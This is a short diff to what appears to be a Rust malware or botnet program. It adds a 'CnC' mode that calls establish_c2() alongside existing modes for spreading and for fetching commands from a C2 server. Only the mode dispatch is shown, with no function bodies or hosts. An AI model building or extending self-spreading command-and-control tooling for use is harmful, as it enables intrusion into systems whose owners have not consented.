@@ -51,8 +51,10 @@ enum Modes {
     Spread,
     /// Dump the current configuration file
     DumpConfig,
-    /// Call out to C2 server for instructions
+    /// Call out to Command and Control (C2) server for instructions
     GetCommand,
+    /// Establish a new C2 server
+    CnC,
 }
 
 fn main() {
@@ -108,6 +110,7 @@ fn main() {
             Modes::Spread => spread(),
             Modes::DumpConfig => dumpconf(&conf),
             Modes::GetCommand => get_commands(get_c2s(&conf), get_docname(&conf)),
+            Modes::CnC => establish_c2(),
             // _ => unreachable!(), // panics if code becomes not unreachable
         }
     } else {
